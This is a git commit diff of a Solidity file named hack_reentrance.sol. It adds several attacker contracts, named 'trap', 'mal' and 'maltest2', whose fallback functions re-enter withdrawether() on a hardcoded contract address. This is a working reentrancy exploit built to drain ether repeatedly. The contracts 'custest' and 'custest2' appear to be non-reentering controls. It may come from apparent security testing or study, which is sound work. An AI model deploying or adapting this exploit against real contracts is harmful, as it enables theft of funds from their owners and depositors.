29d8dce9b93a6c9a7dd9552e19f0fb1bb1949b74
Mid-Push <791397125@qq.com>
2017-03-13 21:09:47 +0800

    Update hack_reentrance.sol

--- hack_reentrance.sol
+++ hack_reentrance.sol
@@ -1,12 +1,16 @@
 pragma solidity ^0.4.8;
 
 contract trap{
+    
     function()payable{
         address addr=0x0eF1F377f6040a8eA1d6ccBBB18866c857e205EA;
         if(addr.call(bytes4(sha3("withdrawether()"))))
         {}
     }
-    function getbalance()constant returns(uint){}
+    function getbalance()constant returns(uint){
+        
+         return this.balance;
+    }
     function deposit(address addr,uint x)returns(bool){
         x=x*(10**18);
         if(!addr.call.gas(200000).value(x)(bytes4(sha3("deposit()"))))
@@ -17,6 +21,107 @@ contract trap{
         
         return withdraw(addr).withdrawether();
         
+    }
+}
+//0x0eF1F377f6040a8eA1d6ccBBB18866c857e205EA
+contract mal{
+    
+    function()payable{
+        address addr=0x0eF1F377f6040a8eA1d6ccBBB18866c857e205EA;
+        withdraw(addr).withdrawether();
+        {}
+    }
+    function getbalance()constant returns(uint){
+        
+         return this.balance;
+    }
+    function deposit(address addr,uint x)returns(bool){
+        x=x*(10**18);
+        if(!addr.call.gas(200000).value(x)(bytes4(sha3("deposit()"))))
+            return false;
+        return true;
+    }
+    function customer_withdraw(address addr) returns (bool){
+        
+        return withdraw(addr).withdrawether();
+        
+    }
+}
+contract maltest2{
+    uint x;
+    function()payable{
+        x++;
+        address addr=0x0eF1F377f6040a8eA1d6ccBBB18866c857e205EA;
+        withdraw(addr).withdrawether();
+        
+    }
+    function getbalance()constant returns(uint){
+        
+         return this.balance;
+    }
+    function deposit(address addr,uint x)returns(bool){
+        x=x*(10**18);
+        if(!addr.call.gas(200000).value(x)(bytes4(sha3("deposit()"))))
+            return false;
+        return true;
+    }
+    function customer_withdraw(address addr) returns (bool){
+        
+        return withdraw(addr).withdrawether();
+        
+    }
+    function getx()constant returns(uint){
+        return x;
+    }
+}
+contract custest{
+    uint x;
+    function()payable{
+       
+        x++;
+    }
+    function getbalance()constant returns(uint){
+        
+         return this.balance;
+    }
+    function deposit(address addr,uint x)returns(bool){
+        x=x*(10**18);
+        if(!addr.call.gas(200000).value(x)(bytes4(sha3("deposit()"))))
+            return false;
+        return true;
+    }
+    function customer_withdraw(address addr) returns (bool){
+        
+        return withdraw(addr).withdrawether();
+        
+    }
+    function getx()constant returns(uint){
+        return x;
+    }
+}
+contract custest2{
+    uint x;
+    function()payable{
+       
+        
+    }
+    function getbalance()constant returns(uint){
+        
+         return this.balance;
+    }
+    function deposit(address addr,uint x)returns(bool){
+        x=x*(10**18);
+        if(!addr.call.gas(200000).value(x)(bytes4(sha3("deposit()"))))
+            return false;
+        return true;
+    }
+    function customer_withdraw(address addr) returns (bool){
+        
+        return withdraw(addr).withdrawether();
+        
+    }
+    function getx()constant returns(uint){
+        return x;
     }
 }
 contract newcustomer{
